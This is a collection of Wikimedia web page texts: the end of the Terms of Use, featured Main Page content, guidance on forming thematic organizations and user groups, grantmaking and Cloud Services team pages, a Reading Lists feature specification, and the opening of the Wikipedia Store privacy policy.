The Wikimedia Foundation will not be liable to you or to any other party for any direct, indirect, incidental, special, consequential or exemplary damages, including but not limited to, damages for loss of profits, goodwill, use, data, or other intangible losses, regardless of whether we were advised of the possibility of such damage. In no event shall our liability exceed one thousand U.S. dollars (USD 1000.00) in aggregate. In the case that applicable law may not allow the limitation or exclusion of liability or incidental or consequential damages, the above limitation or exclusion may not apply to you, although our liability will be limited to the fullest extent permitted by applicable law.


16. MODIFICATIONS TO THESE TERMS OF USE

Just as the Wikimedia community's input is essential for the growth and maintenance of the Projects, we believe that community input is essential for these Terms of Use to properly serve our users. It is also essential for a fair contract. Therefore, we will provide these Terms of Use, as well as any substantial future revisions of these Terms of Use, to the community for comment at least thirty (30) days before the end of the comment period. If a future proposed revision is substantial, we will provide an additional 30 days for comments after posting a translation of the proposed revision in at least three languages (selected at our discretion). The community will be encouraged to translate the proposed revision in other languages as appropriate. For changes for legal or administrative reasons, to correct an inaccurate statement, or changes in response to community comments, we will provide at least three (3) days' notice.

Because it may be necessary to modify these Terms of Use from time to time, we will provide notice of such modifications and the opportunity to comment via the Project websites, and via a notification on WikimediaAnnounce-L. However, we ask that you please periodically review the most up-to-date version of these Terms of Use. Your continued use of our services after the new Terms of Use become official following the notice and review period constitutes an acceptance of these Terms of Use on your part. For the protection of the Wikimedia Foundation and other users like yourself, if you do not agree with our Terms of Use, you cannot use our services.


17. OTHER TERMS

These Terms of Use do not create an employment, agency, partnership, or joint venture relationship between you and us, the Wikimedia Foundation. If you have not signed a separate agreement with us, these Terms of Use are the entire agreement between you and us. If there is any conflict between these Terms of Use and a signed written agreement between you and us, the signed agreement will control.

You agree that we may provide you with notices, including those regarding changes to the Terms of Use, by email, regular mail, or postings on Project websites.

If in any circumstance, we do not apply or enforce any provision of these Terms of Use, it is not a waiver of that provision.

You understand that, unless otherwise agreed to in writing by us, you have no expectation of compensation for any activity, contribution, or idea that you provide to us, the community, or the Wikimedia Projects or Project editions.

Notwithstanding any provision to the contrary in these Terms of Use, we (the Wikimedia Foundation) and you agree not to modify the applicable terms and requirements of any free license that is employed on the Projects or Project editions when such free license is authorized by these Terms of Use.

These Terms of Use were written in English (U.S.). While we hope that translations of these Terms of Use are accurate, in the event of any differences in meaning between the original English version and a translation, the original English version takes precedence.

If any provision or part of a provision of these Terms of Use is found unlawful, void, or unenforceable, that provision or part of the provision is deemed severable from these Terms of Use and will be enforced to the maximum extent permissible, and all other provisions of these Terms of Use will remain in full force and effect.


THANK YOU!

We appreciate your taking the time to read these Terms of Use, and we are very happy to have you contributing to the Projects and using our services. Through your contributions, you are helping to build something really big – not only an important collection of collaboratively edited reference Projects that provides education and information to millions who might otherwise lack access, but also a vibrant community of like-minded and engaged peers, focused on a very noble goal.

The updated Terms of Use went into effect on May 25, 2012. The previous version, at http://wikimediafoundation.org/wiki/Terms_of_Use_(2009), was effective until May 24, 2012. In the event of any differences in meaning between the original English version and a translation, the original English version takes precedence.

OUR STORE'S MISSION

Wikipedia volunteers are special. They hail from all across the globe, representing every professional and personal experience one can imagine. They donate tons of hours per year to writing and editing Wikipedia. Without them, we would not exist.

We can’t thank them enough - but we’re trying. That’s why we created the Merchandise Giveaway Program, amongst other projects. Through it, any Wikipedia user can nominate a Wikipedia contributor to receive a free gift in the mail. We had a great time finding creative and sustainable merchandise for this program. When people started asking if they could buy our shirts, bags and pens, we thought - why not?

What goes around, comes around. We invite you to support the community with your purchase. Thank you for being a part of it!

FROM TODAY'S FEATURED ARTICLE

Map of the Emirate of Granada

Muhammad IV (14 April 1315 – 25 August 1333) was the ruler of the Emirate of Granada (map pictured) on the Iberian Peninsula from 1325 to 1333. He was the sixth sultan of the Nasrid dynasty, succeeding to the throne at the age of 10 when his father, Ismail I, was assassinated. The initial years of his reign were marked by civil war between his ministers, drawing in Castile, Granada's neighbour to the north. The civil war ended in 1328 when Muhammad took a more active role in government. Castile and the kingdom of Aragon invaded Granada in 1330. In 1332, Muhammad sailed to the Marinid court at Fez to request help, and the new Marinid sultan Abu al-Hasan Ali sent 5,000 troops, who besieged the Castilians at Gibraltar. The town surrendered in June 1333 but was in turn besieged. After confused fighting a truce was agreed on 24 August 1333 that restored the 1331 treaty. One day later, Muhammad was assassinated, aged 18. He was succeeded by his brother Yusuf I. (Full article...)

FROM TODAY'S FEATURED LIST

Toshihide Maskawa and Makoto Kobayashi

The Sakurai Prize, awarded by the American Physical Society, honors "outstanding achievement in particle theory" and is presented annually at the Society's April meeting. The award was established in November 1984 with an endowment fund provided by the family and friends of physicist Jun John Sakurai, who died in October 1982. The prize consists of a US$10,000 cash award, an allowance for the recipient to travel to the ceremony, and a certificate citing their contributions. The Sakurai Prize is administered by the Society's Division of Particles and Fields, and winners are chosen by a selection committee. The prize may be shared by multiple people. The inaugural recipients, Toshihide Maskawa and Makoto Kobayashi (both pictured), were awarded the prize in 1985 for their work on the electroweak interaction. The first woman to receive the Sakurai Prize was Mary K. Gaillard in 1993. (Full list...)

TODAY'S FEATURED PICTURE

Black Sunday was a severe dust storm that occurred on April 14, 1935, as part of the Dust Bowl, a period of severe dust storms in the American prairies in the 1930s. The storm first hit the Oklahoma panhandle and northwestern Oklahoma, then moved south into Texas. The conditions were the most severe in the Oklahoma and Texas panhandles, but the storm's effects were also felt in surrounding areas. Drought, erosion, bare soil, and winds caused the dust to fly freely and at high speeds. It is estimated that 300,000 tons of topsoil were displaced from the prairie area. Black Sunday was one of the worst dust storms in American history and caused immense economic and agricultural damage. This photograph shows the storm approaching Stratford, Texas.

Welcome to the English-language Wiktionary, a collaborative project to produce a free-content multilingual dictionary. It aims to describe all words of all languages using definitions and descriptions in English.
Wiktionary has grown beyond a standard dictionary and now includes a thesaurus, a rhyme guide, phrase books, language statistics and extensive appendices. We aim to include not only the definition of a word, but also enough information to really understand it. Thus etymologies, pronunciations, sample quotations, synonyms, antonyms and translations are included.
Wiktionary is a wiki, which means that you can edit it, and all the content is dual-licensed under both the Creative Commons Attribution-ShareAlike 4.0 International License and the GNU Free Documentation License. Before you contribute, you may wish to read through some of our help pages, and bear in mind that we do things quite differently from other wikis. In particular, we have strict layout conventions and inclusion criteria. Learn how to start a page, how to edit entries, experiment in the sandbox and visit our Community Portal to see how you can participate in the development of Wiktionary.

Wikimedia thematic organizations are independent non-profit organizations founded to support and promote the Wikimedia projects within a specified focal area. Like chapters, and unlike user groups, they are required to have a legal structure, maintain detailed records on activities, maintain an expertise in their focal area, and share that expertise with the Wikimedia movement.

What are Wikimedia thematic organizations?

Wikimedia thematic organizations are independent non-profit organizations founded to support and promote the Wikimedia projects within a specified focal area. Like the Wikimedia Foundation, they aim to "empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally". Thematic organizations use a name clearly linking them to Wikimedia and are granted use of Wikimedia trademarks for their work, publicity, and fundraising. Currently, 2 thematic organization exists.

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks, access to unique grants, and additional affiliate support; however, recognition is not required to do any of the work a typical Wikimedia user group, and groups are encouraged to consider that model if they do not yet meet the requirements of a thematic organization.




Wikimedia thematic organizations (2)

Thematic organizations are incorporated independent non-profits representing the Wikimedia movement and supporting work focused on a specific theme, topic, subject or issue within or across countries and regions.

Why should we apply?

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks and to get grants; however, recognition is not required to do any of the work typical user groups do or might do, it is an optional extra step with connected benefits and some requirements.

Benefits of becoming a recognized Wikimedia thematic organization includes:

 * Use the Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy without any additional approval. Thematic organizations may use other logos not part of the Trademark Policy (such as the Wikimedia Foundation logo) pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Receive large, but limited, quantities of Wikimedia merchandise for use in activities and outreach efforts.
 * Public recognition of the group's affiliation with the Wikimedia Foundation.
 * Affiliations Committee Liaison support during and after the approval process.
 * Apply for Annual Plan Grants after successfully completing two other Wikimedia Foundation grants and meeting other eligibility requirements.
 * A short name clearly linking the group to Wikimedia.
 * Exclusive use by a thematic organization of the Wikimedia name and brand within the group's thematic focus area.
 * Communications and public policy support from the Wikimedia Foundation.
 * Two scholarships to attend the Wikimedia Conference, held annually in Berlin for Wikimedia movement affiliates.

Without recognition, groups may still:

 * Engage in group activities to promote, build, and support the Wikimedia movement and its projects.
 * Utilize the Wikimedia Community logo.
 * Request one-time use of Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Apply for Project & Event Grants, Individual Engagement Grants, and Travel & Participation Support.






What are the eligibility requirements?
Main page: Requirements for Wikimedia thematic organizations

The requirements to set up an officially recognized Wikimedia thematic organization are designed to be help groups meet the movement's expectations for them once they are recognized.

 1. Wikimedia supportive mission
    The mission of the organization must be in line with the mission and vision of the Wikimedia Foundation, as well as the guiding principles of the Wikimedia Foundation and principles of movement affiliates. Regardless of the chosen legal form or incorporation method, the thematic organization must have goals similar to those of the Wikimedia Foundation, and its activities should not stray from them.
 2. Thematic focus
    The thematic organization has a clear cultural, linguistic, or otherwise thematic focus. Thematic organizations need a clearly defined and unique scope. Wikimedia is an international movement, therefore, when setting up a thematic organization questions of language, geographic area of operation, and membership criteria need to be determined. While there can be multiple user groups serving a similar or single focus area, there can only be one thematic organization covering their designated thematic focus area.
 3. Legal structure
    The thematic organization must have a legal structure/corporation that is legally independent from the Wikimedia Foundation. Thematic organizations are meant to give a real-life structure to projects that might arise from contributors or external parties in line with the goals of the Wikimedia Foundation. However, thematic organizations are not meant to operate the Wikimedia projects nor to be legally responsible for the content of the projects. In order to achieve that, it is necessary that the legal structure chosen for the creation of a thematic organization is clearly independent from the Wikimedia Foundation. The organization's governing documents, generally by-laws, must be reviewed and approved by the Affiliations Committee.
 4. Critical mass of active Wikimedia contributor involvement
    The thematic organization must involve at least ten, preferably at least twenty, active contributors to the Wikimedia projects. An active contributor is defined as a members with 300 or more contributions to a Wikimedia project on a registered account that has existed for more than 6 months in good community standing (meaning they are not currently suspended or otherwise prevented from participating). While thematic organizations should welcome the input of people who are not active contributors to the Wikimedia projects, they should not stay too far from the community. The active involvement of contributors to the Wikimedia projects is necessary for a thematic organization to be able to bring real-life initiatives tied to the Wikimedia projects to life. Initial membership should broadly reflect the intended scope, thematic and geographic area of activity and chosen languages of operation of the organization.
 5. At least two years of activities
    Groups must have two years of demonstrable programmatic results prior to applying for thematic organization recognition. Ideally these activities should be done as a recognized Wikimedia user group. These activities, and their results, must be documented on-wiki, ideally on the group's Meta-Wiki page. Wide outreach efforts to encourage participation and involvement in setting up and shaping the organization are necessary. Activities should be a mixture of online and offline activities designed to encourage participation on the Wikimedia projects. The group must be up to date on its activity and financial reports prior to being considered for recognition.
 6. Capacity, or planned capacity, to meet the future expectations
    Something that makes thematic organizations and chapters unique from user groups are the increased expectations. Does your group have the capacity to meet the expectations of thematic organization once you receive recognition? This will be something both the Affiliations Committee and Board of Trustees will consider in reviewing your application. If your group does not have a track record of activities which indicate that you will successfully be able to meet these expectations, that can cause your application to be denied. Consideration will be given for the financial circumstances of the group, realistic demands in your group's focus area, and plans to secure future funding to meet these expectations.




How do we apply for recognition?

Once you've gathered the group, the wiki page, legal documents, and the big ideas on what you want to do, contact the Affiliations Committee and request to apply for thematic organization recognition. The Affiliations Committee will ask you some questions, review your application, and if appropriate will recommend the Wikimedia Foundation Board of Trustees recognize your group as an official Wikimedia Thematic Organization. The Board of Trustees will then vote to approve or grant recognition based on the application, discussions with the Affiliations Committee, and recommendation from the Affiliations Committee. Recognition automatically renews each year. Recognition can be suspended or removed if necessary if a group becomes inactive or is no longer compliant with their agreement.

Delays during the application approval process most often arise from incomplete applications or applications that need to be modified before they can be approved. To prevent this from happening and help expedite your group's approval process, please double check this list before submitting your application:

 1. Does your name meet the affiliates naming requirements? Group discussions amongst Wikimedia thematic organizations regarding their name can take time, and generally you want to avoid having to re-engage in that conversation after your application has been submitted. You may contact the Affiliations Committee to seek input on your name before submitting your application.
 2. Does your group have a clear scope and purpose that is consistently and clearly explained? If your Meta page explains your thematic organization in a way that differs from your application, and if those differ from the activities your group is undertaking – that may delay the application's approval as a clear scope and purpose is required for the resolution to approve the thematic organization and the thematic organization agreement which the two primary contacts will be signing with the Wikimedia Foundation. Your scope and purpose statement should clearly and concisely explain what your group hopes to accomplish and who would be interested in joining. We recognize this may evolve over time, but you should have a clear commitment to a specific statement at the time of your application.
 3. Are your two primary contacts willing to identify themselves with the Wikimedia Foundation? Sometimes privacy concerns might cause someone to change their minds, which can delay the final steps in the user group recognition process.
 4. Is your group ready to accept new members and already include at least ten active Wikimedia contributors in good standing? Groups which have a closed or limited membership model may require more discussion and review. Groups which do not have at least ten active members who are also active Wikimedia contributors in good standing will not be approved.

Our approach

The Wikimedia Foundation Community Resources team, Wikimedia contributors, and affiliate organizations work together.
We find and fund innovative and important projects, and evaluate and share the impact of the work being done across the movement. In addition to financial support, we provide grantees with tools, mentorship, and opportunities to tell their own stories and share their knowledge.

Our participatory grantmaking process is founded on wiki principles.
The Community Resources team's goals and targets are developed in collaboration with the volunteer communities we serve. Decisions about which proposals to fund are made on public wikis and in cooperation with volunteers and affiliates.



We support impact-driven projects.
The non-profit Wikimedia Foundation is supported primarily by individual donors — readers and content contributors who believe in our mission and rely on our high quality free content. The role of the Community Resources team is to re-invest a portion of that budget back into our movement by supporting projects that further our mission. We develop strong evaluation frameworks and effective strategies for grants, in order to build on past successes and learn from our failures. Our research uses both quantitative and qualitative elements of measuring the impact of grants. Our learning and evaluation team helps our movement as a whole better understand how to realize our ambitious goals, and how to build a wider culture of self-assessment, critical thinking, and knowledge sharing within the Wikimedia movement.

Our goals

We encourage projects that provide opportunities to reach the Wikimedia movement's goal of spreading participation in free culture across boundaries of language, gender, and geography. We seek out opportunities for growth in under-represented demographics, smaller and newer Wikimedia projects, and emerging communities. We focus on providing individuals within these communities with information and tools to help them succeed.



We believe that a diversity of perspectives is crucial to increasing the quality of the free knowledge resources that our movement provides. Grants can be a powerful tool for encouraging the growth of new projects, supporting the participation of new Wikimedians from more countries and cultures, and for increasing the diversity of contributions within mature projects and in geographies with established communities of contributors. Our goal is to develop and execute an innovative grantmaking strategy that promotes growth among under-resourced and emerging regions, languages, and communities in our movement. We support strategies for narrowing the gender gap in terms of both content and contributors.

Wikipedia and the Wikimedia movement have shown the world what individuals can achieve. Grantmaking at WMF follows the paradigm of our free culture projects of empowering individuals to work collaboratively to make positive change in their own communities. We entrust our grantees with the responsibility to design and lead their own projects, while providing them with resources to help those projects succeed.

Who we are

Wikimedia Grantmaking is a collaboration between grantees, WMF staff, volunteer committees, and Wikimedians from across the globe. We connect people from dozens of Wikimedia projects and geographies within our worldwide free culture movement.



Grantees are the prime movers of Wikimedia Grantmaking. They identify new opportunities and unmet needs within their local communities and wiki projects, propose projects, and see them through to completion. Grantees work with WMF staff, committee members, and other community volunteers to plan their projects, implement their ideas, measure impact, and share what they learned.

The Wikimedia Foundation's Community Resources team supports six grantmaking streams and Wikimania scholarships—Conference and Travel Support, Project and Rapid Grants, and Simple and FDC Annual Plan Grants. There are six grants program officers, a grants administrator, a conference organizer, and a community organizer. Community Resources staff work closely with WMF's Learning & Evaluation, Education, Wikipedia Library, Community Liaison, Community Advocacy, Analytics, Legal, Finance, and Executive teams.



Grantmaking committee members are the primary advisors and decision-makers within our grants programs. Our five committees are made up of contributors from different language Wikipedia and sister projects, and include volunteer participants from around the world. Committee members provide guidance and feedback to grant applicants, supporting prospective grantees throughout the proposal and review process. Grantmaking committees work with WMF staff to disburse over $8 million in annual funding.

Strong community participation is critical to our success. The broader Wikimedia community participates in grantmaking processes in important ways. Community members endorse and comment on grant proposals, brainstorm bold new initiatives in the IdeaLab, and share knowledge through Learning Patterns. They often participate with specific projects by offering their expertise, such as evaluation support or design help. Multilingual Wikimedians take the lead on translating and localizing grantmaking portals, instructional documentation, project reports, and blog posts, making the process and the outcomes of WMF grantmaking more accessible and engaging to non-English speakers.





Share knowledge

We value bold ideas and data-driven innovation. Effective grantmaking requires community involvement at every point in the process. Our community portals provide shared workspaces for proposing and refining new ideas, asking questions, and sharing valuable lessons.

[edit]

The Wikimedia Foundation operates eleven content projects that follow the free content model, with their main goal being the dissemination of knowledge.

This page contains links to central pages on each Wikimedia wiki. Please add any missing wikis (see Complete list of Wikimedia projects — many seem to be missing) and fill in any missing links you find.

A short list with links only to each wiki's main page can be found at Complete list of Wikimedia projects . The lists are sorted by project and alphabetically by language code.

Wikimedia Cloud Services
Maintain and extend computing infrastructure, Toolforge and additional supporting technologies used in the Cloud Services environment.

Group: Product and Technology → Developer Experience Start: 2017-04-01 Team members: see #Team Backlog: #cloud-services-team

The Wikimedia Cloud Services team (WMCS) is responsible for maintaining and extending the existing Wikimedia Cloud Services computing infrastructure (virtual private server (VPS)), the Toolforge hosting environment (platform as a service (PaaS)), and many additional supporting technologies used in the Cloud Services environment. The team works in partnership with the larger Wikimedia volunteer community to manage the physical and virtual resources that power the environment and provide technical support to volunteer developers and other Wikimedia Cloud Services users.

SOCIAL NORMS

Our Team Social Norms are a collaboratively written set of guidelines that we want to follow as a team.


ENHANCEMENT PROPOSALS

There is rarely a shortage of ideas in the Cloud Services community. If you are not a member of the Cloud Services team, you can still propose new services and ideas! Please follow this process to create a new proposal.


DECISION MAKING

For proposals related to WMCS team internal procedures, we have defined a separate Decision Making process.


MISSION

The mission of the Wikimedia Foundation is to empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally. Technology serves a key role in these activities by lowering barriers to large-scale collaboration and reducing publishing costs to negligible levels. A significant portion of the technology used by the Wikimedia movement is developed by the movement itself, and these products need support in the form of compute resources, technical guidance, and community support to flourish.


OBJECTIVES

The strategic activities of the Wikimedia Cloud Services team have two objectives to support our mission:

 1. Reduce the barriers to making technical contributions to the Wikimedia movement.
 2. Provide excellent hosting solutions to support technical projects.


RESPONSIBILITIES

 1. Provide a stable and effective hosting platform for technical projects relevant to the Wikimedia movement when such projects are incompatible with Wikimedia Foundation production hosting.
 2. Develop and maintain services and platforms that empower the creation, operation, and maintenance of custom technical solutions to problems of the Wikimedia movement.
 3. Provide public, simple access to content and data produced by the Wikimedia projects to empower new technological and social solutions to problems of the Wikimedia movement.
 4. Provide technical support, documentation, and community support to foster growth and productivity of the community of users of the WMCS products.


OUR AUDIENCES

Wikimedia Cloud Services caters to various audiences, ranging from contributors with limited technical experience to professional software engineers.

What are Wikimedia user groups?

Wikimedia user groups are intended to be simple and flexible affiliates that are an alternative to chapters and thematic organizations - which require more formal requirements. User groups are highly valued as equal players in the Wikimedia movement. They are meant to empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally.

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks and to get certain grants; however, recognition is not required to do any of the work typical user groups do or might do, it is an optional extra step with connected benefits and some requirements.

Why should we apply?

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks and to get certain grants; however, recognition is not required to do any of the work typical user groups do or might do, it is an optional extra step with connected benefits and some requirements.

Benefits of becoming a recognized Wikimedia user group include:

 * Use the Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy without any additional approval. User groups may use other logos not part of the Trademark Policy (such as the Wikimedia Foundation logo) pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Receive large, but limited, quantities of Wikimedia merchandise for use in activities and outreach efforts.
 * Public recognition of the group's affiliation with the Wikimedia Foundation.
 * Affiliations Committee Liaison support during and after the approval process.
 * One scholarship to attend the Wikimedia Conference, held annually in Berlin for Wikimedia movement affiliates.

Without recognition, groups may still:

 * Engage in group activities to promote, build, and support the Wikimedia movement and its projects.
 * Utilize the Wikimedia Community logo.
 * Request one-time use of Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Apply for Project & Event Grants, Individual Engagement Grants, and Travel & Participation Support grants.



What are the eligibility requirements?
Main article: Wikimedia user groups/Requirements

Wikimedia user groups are intended to be simple and flexible affiliates with far fewer requirements than chapters and thematic organizations. Even affiliates hoping to become a chapter or thematic organization are not expected to meet the requirements for those affiliate models to apply for Wikimedia user group recognition.

The requirements to set up an officially recognized Wikimedia user group are meant to be light-weight and easy to follow.

 1. Three active Wikimedia editors
    While it is recommended that user groups have about 10 members, it is required that at least 3 members are active with 500 or more contributions to a Wikimedia project (in the case of Wikidata: 800 or more edits) in a year preceding the application on a registered account that has existed for at least 6 months. These active members must be in good community standing (meaning they are not currently suspended or otherwise prevented from participating). While user groups should welcome the input of people who are not active contributors to the Wikimedia projects, and are required to allow new members to join, they should not stray too far from the community. An active involvement of contributors to the Wikimedia projects is necessary to enable a user group to bring its real-life initiatives to life in the Wikimedia projects.
 2. Agree to Wikimedia user group agreement and code of conduct
    Your group must agree to the Wikimedia user group agreement and code of conduct - which outlines basic expectations of Wikimedia user groups, such as on-wiki documentation of activities, operating within Wikimedia guiding principles, and compliance with the Trademark policy. When you submit your application, you will be asked to agree to both the Wikimedia user group agreement and code of conduct.

If your user group application is not able to meet these criteria you are still welcome to apply but we would like to understand your motivation for why you think these criteria are not important to your initiative. Please address these two questions in your motivation:

 1. How would your user group contribute to the mission of the Wikimedia Movement
 2. How does the background of the founding members contribute to the success of your user group

Examples of applications that could have good reasons for not meeting the criteria are things like research groups or other initiatives which do not require you to be an active contributor.

Please be aware that if you do not meet the three criteria outlined above, the Affiliations Committee will need more time to discuss your application (and hopefully approve it), this might also involve some more communication with the founding members of the user group application, so please watch your inbox for mails on this topic so that you can respond to them quickly.



How do we apply for recognition?
Main article: Wikimedia user groups/Creation guide

Once you've completed the steps, visit the Wikimedia user group application page and apply for recognition.

Delays often happen with incomplete applications. To prevent this happening, please double-check this list before submitting your application:

 1. Did the group follow the affiliates' naming requirements? Group discussions about names can take a long time. It is best to only do this once! You may contact the Affiliations Committee to seek input on the name before applying.
 2. Does your group have a clear scope and purpose that is consistently and clearly explained? If your Meta page explains your user group in a way that differs from your application, and if those differ from the activities your group is undertaking - that may delay the application's approval as a clear scope and purpose is required for the resolution to approve the user group and the user group agreement which the two primary contacts will be signing with the Wikimedia Foundation. Your scope and purpose statement should clearly and concisely explain what your group hopes to accomplish and who would be interested in joining. We recognize this may evolve over time, but you should have a clear commitment to a specific statement at the time of your application.
 3. Are your two primary contacts willing to identify themselves with the Wikimedia Foundation? Sometimes privacy concerns might cause someone to change their minds, which can delay the final steps in the user group recognition process.
 4. Is your group ready to accept new members and already include at least three Wikimedia editors in good standing? Groups which have a closed or limited membership model may require more discussion and review. Groups which do not have at least three active members who are also active Wikimedia editors in good standing will not be approved.
 5. Are your designated leaders and group as a whole willing to follow the Wikimedia user group agreement and code of conduct? All leaders who are named on the application must agree prior to the application being sent. Applicants found to be violating the agreement or code of conduct will not be approved, and existing Wikimedia user groups found to be violating the agreement or code of conduct may have their affiliation status rescinded.

EXISTING APP READING LIST FEATURES

This project was completed in 2018. For updated information on iOS, please visit our Wikimedia Apps iOS FAQ section, and for Android, refer to this section.


SAVED PAGES ON IOS

For several years, the iOS app has had a Saved Pages feature which allows users to bookmark articles for reading later, and also saves those articles so they are available offline. Users can save articles to their Saved Pages library using the Bookmark icon available on all articles, and in many other places throughout the app. These articles are saved in a flat list (no folders or user metadata), and stored only locally to the device.


READING LISTS ON ANDROID

In early 2016, the Android team updated their existing Saved Pages to a new feature called Reading Lists. Reading Lists allowed users to put saved articles into folders and to label and make a basic description for their folders. The original feature design included the ability for logged-in users to sync their lists across devices, using the list storing capabilities of the Collections extension. For reasons unrelated to the apps and their user's needs, these plans were paused. In early 2017 the Android team made a number of improvements to the Reading Lists feature, to make them easier to manage for users and solidify the offline saving elements, based on research identifying offline saving as a major area of focus for serving New Readers.


WEB BROWSER EXTENSION

As of April 2019, Reading Lists can still only be viewed within Wikipedia Android and iOS apps, but there is a browser extension for adding articles to a user's Reading List from the web available on Chrome and Firefox.

https://phabricator.wikimedia.org/T247705#9048423 implies that this browser extension is no longer supported.
 * Download for Firefox
 * Download for Chrome

More information can be found on the Reading list browser extension page.


STRATEGIC PURPOSE

In addition to the demonstrated user interest in Reading Lists (see below), improvement to this feature is part of our strategy of improving retention of app users as part of the "Better Encyclopedia" strategy. We believe that by providing mobile friendly ways for users to personalize and make the Wikipedia app part of their lives, they will use the app more regularly, be more invested in the app and the movement, and learn more.


USER INTEREST AND UTILIZATION


USER REQUESTS

 * For iOS users, reading lists functionality (including foldering and syncing) is the second most requested feature via OTRS (1st is "dark reading mode").
 * For Android users, losing their carefully curated reading lists when updating or switching devices is the number 1 complaint received via OTRS.


EXISTING FEATURE USE

The Android Reading lists feature is one of the most prominent/used features of the app. Some specifics around the exiting feature usage:

 * Reading Lists are used by approximately 10.5% of Android users (730K / 7M active users).
 * Median pages per list: 3
 * Average pages per list: 17
 * Approximate total number of lists: 1,059,354
 * Approximate number of lists per user: 1.45
 * Approximately 77% of users who use Reading Lists have only one list

We expect the usage curve to be similar for the reading lists feature across both platforms, with some increase in utilization driven by better on-boarding and awareness


USER SURVEY

A survey ran in-app on both Wikipedia Android and iOS which asked about motivations for the existing feature as well as proposed capability, such as cross-device syncing.
Read the full report of findings on the Reading lists survey results page.
The original details of this task can be seen at: https://phabricator.wikimedia.org/T164770


PERSONAS AND STORIES


MICHELLE

Michelle is the core power Reader persona. Michelle lives in the global north, with fast internet access. She owns a tablet and updates her devices every 2-3 years. She has the need to manage her storage space on the device, but is less concerned about bandwidth or use of reading lists offline.

 * As a user, I want to sync reading lists across my devices and browsers
 * As a user, I want to name and customize my lists with color, image, icon, etc…
 * As a user, I want to reorder my lists
 * As a user, I want to delete lists I no longer want
 * As a user, I want to add entries from multiple wikis in my lists
 * As a user, when I add a new entry to a list, it should appear as the first item so it easy to find
 * As a user, I want to reorder the entries in my lists
 * As a user, I want to delete entries from my lists
 * As a user, I want a default list which will not require me to manage lists
 * As a user, I want to search the content of my reading lists
 * As a user, I want to know the number of items in each reading list
 * As a user, I expect the list UI to be responsive
 * As a user, I want to explicitly opt in before enabling syncing
 * As a user, I want a way to opt out of saving my lists and delete them all from the server
 * As a user, I want my reading lists to update in the background


SANDEEP

Sandeep is a New Reader persona. Sandeep lives in India and has two devices. He pays by the byte and is cautious about bandwidth usage.

Most of the core stories for organizing and storing lists also apply to Sandeep, with higher priority to some stories around offline support. Additionally, Sandeep has two priority uses not included in Michelle's needs.

 * As a user, I want to know the size of the content of my reading lists (both total and individual pages with images) before I download so I understand how it affects my data usage and device storage
 * As a user, I want my bandwidth to be used efficiently


PRIVACY AND DATA STORAGE

Storing any user data is something the Foundation takes seriously and treats cautiously. Given our deeply held values around user privacy and desire to minimize the amount of information we track and retain about users, we plan to take every possible step to guard that privacy while still being able to serve our reader's desire for lists which can live on more than one device.

In addition to a Foundation Legal review of the terms and privacy statements to ensure they are accurate and clear around these issues, this feature will require:

 * Only logged-in users will be able to sync their lists, and information will be stored based on user account, not device or personal identifiers
 * Users who want their lists to sync will have to "opt-in" through a clearly worded on-boarding. No users' reading lists will be stored on our servers without the user explicitly choosing to do so.
 * Users will have the ability from the app to delete their stored lists. This deletion will be permanent, and not require them to delete or disable their Wikipedia account.


WHY NOT WATCHLIST

Watchlists offer similar functionality and the WatchList infrastructure was evaluated before exploring other options. In general, the needs of WatchLists differ from Reading Lists in a few key ways:

 1. Focused on Reading, not the monitoring of Changes.
    1. Watchlists are squarely focused on monitoring changes of pages/revisions. The Watchlist infrastructure is key to our editor community for monitoring content changes both manually and through the use of bots. Because of these needs, expanding the scope of Watchlists to reading purposes will only make the project harder to maintain and add additional constraints.
    2. By keeping the projects separate, it is easier to scale resources to serve these two different audiences and prioritize the work accordingly. Reading Lists are, by their nature, less critical to the health of Wikipedia/MediaWiki.
 2. Multi-project support. Reading Lists are by nature cross-wiki/project. Watchlists are scoped to specific Wikis. While making them cross-wiki this has been discussed for a while, the resolution is not in the near term.


NOTE ON LARGER LISTS PROJECT

Reading lists are also similar in concept and technology to Offline Compilations, and even the existing Watchlist function. This feature is being designed and developed within a larger context which is described and documented here.

PRIVACY POLICY

 

Privacy Policy

Wikipedia Store Privacy Policy

Welcome to the Wikipedia Store!  The Wikimedia Foundation, Inc., which runs the Wikipedia store, is a nonprofit charitable organization whose mission is to empower and engage people around the world to collect and develop educational content that is under a free license or is otherwise in the public domain, and to disseminate it effectively, globally, and always free of charge.  

We are committed to protecting the privacy of our customers.  This privacy policy— which is specific to the Wikipedia store— seeks to help you understand why and how we use your personal information when you shop with us.

 1. What information we collect and how we collect it

As part of the shopping experience, we collect “Personal Information”, which is information that identifies or relates to the identifiable individual. For example, when you purchase an item from us, we collect your shipping information, which includes your name, address, email address or phone number. If your billing address differs from your shipping address, we will collect that as well. If you choose to create an account with us, we also collect your username and password. Due to the technical operation of websites, your IP address is also transferred to us. 

We collect this Personal Information in order to operate the Wikipedia store, to allow you to purchase items and to complete your transactions. If you do not provide the information requested, we may not be able to provide these services to you.

Like most websites, we also collect other information that does not reveal an individual’s specific identity or does not directly relate to an identifiable individual (“Other Information”), including technical information, as part of our standard web operations. This Other Information that we collect includes data on browser type, operating system, language preferences, referring domain, pages visited, mobile carrier or device, and the date and time of each visitor request.

We make use of cookie technology, including third-party cookies, to collect data from visitors. A cookie is a small data file that is transferred to a computer’s hard disk that allows us to collect additional data about website usage to improve services. We and our service providers use cookies to better understand your use of the Wikipedia store, to make the shopping experience better and safer, and to improve the Wikipedia store’s design and functionality. You may remove or disable some or all cookies through your browser settings, depending on your browser, although some features may not function properly if you disable cookies.


For more information, please visit our Cookie Statement.



 2. Why we need your information and how we use it

